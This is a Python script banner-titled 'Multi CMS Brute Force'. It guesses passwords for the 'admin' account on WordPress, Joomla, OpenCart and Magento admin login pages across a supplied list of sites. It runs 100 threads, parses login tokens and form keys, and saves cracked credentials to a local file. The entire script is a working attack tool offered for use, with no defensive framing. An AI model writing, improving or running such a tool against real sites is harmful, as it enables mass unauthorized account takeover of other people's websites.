import requests, os, sys, re
from multiprocessing.dummy import Pool

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
	
class spe:
	g = '\033[1;32m'
	r = '\033[31m'
	e = '\033[0m'
	
print(spe.g + """
  __  __       _ _   _    ____ __  __ ____  
 |  \/  |_   _| | |_(_)  / ___|  \/  / ___| 
 | |\/| | | | | | __| | | |   | |\/| \___ \ 
 | |  | | |_| | | |_| | | |___| |  | |___) |
 |_|  |_|\__,_|_|\__|_|  \____|_|  |_|____/ 
                                            
  ___          _         ___               
 | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ 
 | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
 |___/_|  \_,_|\__\___| |_|\___/_| \__\___|
                                           
                                                    											
 [""" + spe.r + "#" + spe.g + """] Multi CMS Brute Force
 [""" + spe.r + "#" + spe.g + """] The Best CMS Brute Forcer
 [""" + spe.r + "#" + spe.g + """] Working on WordPress, Joomla, OpenCart, Magento
 [""" + spe.r + "#" + spe.g + """] Maximum Fast Speed
 [""" + spe.r + "#" + spe.g + """] Coded by NinjaCR3
 [""" + spe.r + "#" + spe.g + """] Twitter : @Ninja3Sec
""")
	
session = requests.Session()

admin = "admin"

def wordpress(site):
	try:
		for passwd in password:
			r = requests.get(site + "/wp-login.php",timeout=30)
			if "https://" in r.url:
				site = site.replace("http://","https://")
			else:
				pass
			if "wp-admin" in r.text:
				r = session.post(site + "/wp-login.php",data={'log':admin,'pwd':passwd},timeout=30)
				if "wp-admin/profile.php" in r.text:
					print(spe.g + "Cracked!  -->  " + site + "/wp-login.php : " + admin + " : " + passwd + " [ WordPress ]")
					with open("good.txt","a") as f:
						f.write("WordPress  -->  " + site + "/wp-login.php : " + admin + " : " + passwd + "\n")
					break
				else:
					print(spe.r + "Failed!  -->  " + site + "/wp-login.php : " + admin + " : " + passwd)
			else:
				break
	except:
		print(spe.r + "Not Working!  -->  " + site)
		
	
def joomla(site):
	try:
		for passwd in password:
			r = session.get(site + "/administrator/index.php",timeout=30)
			try:
				token = re.findall('type="hidden" name="(.*)" value="1"',r.text)[0]
				option = re.findall('type="hidden" name="option" value="(.*)"',r.text)[0]
			except:
				token = ''
				option = 'com_login'
			if "https://" in r.url:
				site = site.replace("http://","https://")
			else:
				pass
			if "Joomla" in r.text and "com_" in r.text:
				r = session.post(site + "/administrator/index.php",data={'username':admin,'passwd':passwd,'lang':'en_GB','option':option,'task':'login',token:'1'},timeout=30)
				if "&amp;task=logout" in r.text:
					if "0 Cannot" in r.text:
						print(spe.r + "Failed!  -->  " + site + "/administrator/index.php : " + admin + " : " + passwd)
					else:
						print(spe.g + "Cracked!  -->  " + site + "/administrator/index.php : " + admin + " : " + passwd + " [ Joomla ]")
						with open("good.txt","a") as f:
							f.write("Joomla  -->  " + site + "/administrator/index.php : " + admin + " : " + passwd + "\n")
						break
				else:
					print(spe.r + "Failed!  -->  " + site + "/administrator/index.php : " + admin + " : " + passwd)
			else:
				break
	except:
		print(spe.r + "Not Working!  -->  " + site)


def opencart(site):
	try:
		for passwd in password:
			r = requests.get(site + "/admin/index.php",timeout=30)
			if "https://" in r.url:
				site = site.replace("http://","https://")
			else:
				pass
			if "common/login" in r.text:
				r = session.post(site + "/admin/index.php",data={'username':admin,'password':passwd},timeout=30)
				if "common/logout" in r.text:
					print(spe.g + "Cracked!  -->  " + site + "/admin/index.php : " + admin + " : " + passwd + " [ OpenCart ]")
					with open("good.txt","a") as f:
						f.write("OpenCart  -->  " + site + "/admin/index.php : " + admin + " : " + passwd + "\n")
					break
				else:
					print(spe.r + "Failed!  -->  " + site + "/admin/index.php : " + admin + " : " + passwd)
			else:
				break
	except:
		print(spe.r + "Not Working!  -->  " + site)
		
		
def magento(site):
	try:
		for passwd in password:
			r = session.get(site + "/admin",timeout=30)
			try:
				form_key = re.findall('<input name="form_key" type="hidden" value="(.*?)"',r.text)[0]
			except:
				form_key = '6Tdfk8negawFvLj5'
			if "https://" in r.url:
				site = site.replace("http://","https://")
			else:
				pass
			if "Magento" in r.text:
				r = session.post(site + "/admin",data={'login[username]':admin,'login[password]':passwd,'form_key':form_key,'dummy':''},timeout=30)
				if "link-logout" in r.text:
					print(spe.g + "Cracked!  -->  " + site + "/admin : " + admin + " : " + passwd + " [ Magento ]")
					with open("good.txt","a") as f:
						f.write("Magento  -->  " + site + "/admin : " + admin + " : " + passwd + "\n")
					break
				else:
					print(spe.r + "Failed!  -->  " + site + "/admin : " + admin + " : " + passwd)
			else:
				break
	except:
		print(spe.r + "Not Working!  -->  " + site)
		
		
def cms(site):
	try:
		r = requests.get(site,timeout=30)
		if "wp-content" in r.text:
			wordpress(site)
		elif "index.php?route=" in r.text:
			opencart(site)
		elif "Joomla" in r.text and "com_" in r.text:
			joomla(site)
		elif "Mage.Cookies" in r.text:
			magento(site)
		else:
			print(spe.r + "Other CMS!  -->  " + site)
	except:
		print(spe.r + "Not Working!  -->  " + site)
		
	
sitelist = input("Sitelist --> ")
try:
	print("")
	sites = open(sitelist,"r").read().splitlines()
	password = open("pass.txt","r").read().splitlines()
	pp = Pool(100)
	pr = pp.map(cms,sites)
except:
	print(spe.e + "Files not found! Please try again!")
	sys.exit()